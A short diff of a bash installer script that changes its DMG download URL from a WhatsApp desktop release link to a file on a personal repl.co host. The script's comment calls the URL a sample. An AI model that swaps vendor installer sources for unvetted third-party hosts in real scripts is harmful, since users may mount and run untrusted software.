@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Set the URL of the DMG file to download. This is only sample URL
-dmg_url="https://web.whatsapp.com/desktop/mac_native/release/?configuration=Release"
+dmg_url="https://test.c22code.repl.co/notch.dmg"
 
 # Set the output directory where the DMG will be mounted
 mount_dir="/Volumes/DMG_Mount"
